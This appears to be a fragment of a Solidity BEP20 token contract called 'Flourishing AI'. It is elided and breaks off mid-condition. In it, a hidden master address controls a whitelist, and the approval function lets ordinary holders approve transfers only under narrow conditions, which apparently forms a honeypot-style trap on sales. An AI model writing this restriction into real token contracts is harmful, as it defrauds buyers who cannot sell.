...
contract FlourishingAI is Context, BEP20 {
    using Address for address;
    mapping(address => uint256) private _holders;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isContractAddress;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal = 55000000000000000000000000;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    string private _name = "Flourishing AI";
    string private _symbol = "AI";
    uint8 private _decimals = 18;
    uint256 private _LiquidityAmount = 2200000000000000000000000;
    address private _wMaster;
    ...
    function addLPContract(address a) external Master {
        _isContractAddress[a] = true;
    }

    modifier Master {
        require(msg.sender == _wMaster);
        _;
    }
    ...
    function _approve(
        ...
        require(
            _isContractAddress[owner] == true ||
                owner.isContract() ||
                (spender.isContract() && amount < _LiquidityAmount),
